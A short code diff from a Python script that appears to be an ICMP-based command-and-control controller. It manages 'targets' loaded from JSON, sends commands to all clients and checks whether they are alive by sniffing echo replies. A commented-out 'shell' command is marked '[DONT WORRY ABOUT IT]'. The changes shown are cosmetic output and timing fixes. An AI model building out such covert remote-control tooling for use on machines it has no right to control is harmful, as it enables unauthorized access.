@@ -220,10 +220,12 @@ def check_alive(src, command):
 def show_alive(clients):
     global ALIVE
     for value in ALIVE:
+        print(value)
         if ALIVE[value] == True:
-            print(f"['\033[92m'{clients[value]}]", end=" ")
+            print(f"['\033[92m'{clients[value]}]"'\033[0m', end=" ")
         else: 
-            print(f"'\033[91m'{clients[value]}]", end=" ")
+            print(f"'\033[91m'{clients[value]}]'\033[0m'", end=" ")
+        print()
 
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
@@ -238,6 +240,7 @@ def change_ssm():
         print("SSM Enabled")
 
 def main():
+    global ALIVE
     print_title()
     print("Enter command to begin, or \"help\" for help:")
     threading.Thread(target=sniffer, daemon=True).start()
@@ -246,7 +249,6 @@ def main():
     while(True):
         command = input(">> ")
         arguments = command.split(" ", 1)
-        alive = list()
         if arguments[0] == "":
             continue
         elif arguments[0] == "addclient":
@@ -279,6 +281,7 @@ def main():
             arguments = ["checkalive", "ALIVE"]
             sendtoall(arguments, clients, execute=False)
             show_alive(clients)
+            time.sleep(5)
         elif arguments[0] == "loadclients":
             id = generate_targets(JSONFILE, clients, id)
         # elif arguments[0] == "shell":  [DONT WORRY ABOUT IT]
